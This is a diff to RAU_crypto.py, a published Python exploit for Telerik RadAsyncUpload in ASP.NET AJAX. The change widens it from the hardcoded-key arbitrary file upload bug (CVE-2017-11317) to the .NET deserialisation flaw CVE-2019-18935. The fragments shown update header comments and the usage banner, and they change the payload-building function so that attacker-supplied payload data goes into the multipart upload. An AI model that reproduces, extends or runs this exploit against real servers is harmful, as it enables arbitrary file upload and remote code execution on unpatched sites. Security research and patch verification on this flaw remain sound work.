@@ -3,15 +3,17 @@
 # Author: Paul Taylor / @bao7uo
 # https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py
 
-# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357
+# RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357, CVE-2019-18935
 
 # Telerik Web UI for ASP.NET AJAX
 # RadAsyncUpload hardcoded keys / insecure direct object reference
-# Arbitrary file upload
+# Arbitrary file upload, .NET Deserialisation
 
 # Telerik mitigated in June 2017 by removing default keys in
 # versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
 # RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)
+
+# .NET deserialisation was discovered by @mwulftange and mitigated in R3 2019 SP1 by adding whitelisting feature
 
 # Updated exploit works on later versions where custom keys have been set if you
 # have access to them, e.g. readable web.config
@@ -250,8 +252,7 @@ def payload(TempTargetFolder, Version, payload_filename):
     data2 += "\r\n"
 
     # Concatenate text fields with binary data.
-    with open(payload_filename, "rb") as f:
-        data = bytes(data1, 'utf8') + f.read() + bytes(data2, 'utf8')
+    data = bytes(data1, 'utf8') + payload_file_data + bytes(data2, 'utf8')
     sys.stderr.write("Payload prep done\n")
     return data
 
@@ -388,8 +389,8 @@ if __name__ == "__main__":
 
     sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
     sys.stderr.write(
-            "CVE-2017-11317 - " +
-            "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n"
+            "CVE-2017-11317, CVE-2019-18935 - " +
+            "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload / .NET deserialisation\n\n"
             )
 
     if len(sys.argv) < 2:
